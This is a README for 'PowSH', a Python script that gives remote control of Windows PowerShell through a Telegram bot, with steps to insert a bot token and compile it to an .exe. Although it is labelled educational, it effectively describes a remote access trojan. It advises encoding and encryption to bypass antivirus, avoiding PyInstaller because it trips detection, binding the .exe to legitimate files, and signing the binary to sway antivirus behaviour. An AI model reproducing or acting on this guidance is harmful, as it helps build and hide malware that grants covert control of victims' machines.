# PowSH [Remote Windows PowerShell Control Tool💻]
**`This is a basic Python script for remote Windows PowerShell control. It is still under early development and is primarily provided for educational purposes.😁`**
After installing the dependencies, you can replace the Telegram bot token and generate the .exe output file and run it. Then you can remotely control your Windows PowerShell via the Telegram bot. (Tested on the latest version of Windows 11)
![secbaz(1)](https://github.com/isecbaz/PowSH/assets/157783650/a98d0e5f-0cd9-4f0b-bfd7-932955b6a330)

1. First, install the latest version of Python on your system.
 
>Open the Windows CMD and execute the following commands in sequence to install the required dependencies:

<li>pip install pyTelegramBotAPI</li>
<li>pip install cx_Freeze</li>
<li>pip install uuid</li>
<br>

![@rmsup](https://github.com/isecbaz/PowSH/assets/157783650/457dfa41-c4b7-41c5-930e-6af6ca483648)


3. Open the <b>main.py</b> source file and replace the placeholder <b>`TOKEN`</b> line 7 with your Telegram bot token. Save the file.

![@rezamz](https://github.com/isecbaz/PowSH/assets/157783650/2d61be95-1f0e-4189-bb81-8bb9205fed5a)

**`Download all the files into a single folder. Open CMD and navigate to the directory. Execute the following command:`**
- python setup.py build
- Wait for the .exe file to be generated in the build folder.
![rmsup](https://github.com/isecbaz/PowSH/assets/157783650/bbcc69e2-bd91-4bcb-9b07-d53c8fb2bd11)


5. You can employ various encoding and encryption techniques to bypass antivirus detection. Avoid using PyInstaller as it increases file size and may trigger antivirus alerts.

6.  Extensive modifications will be required for future binding functionalities (binding from .exe to .exe or to other original files).

7. The filename and icon can be modified in the setup.py file. An example chicken icon is provided.

8. Apart from obfuscation and advanced antivirus bypass techniques, the signtool tool can be used to sign your executable with a digital certificate, potentially influencing antivirus behavior.

>Farewell until the next projects.🫣
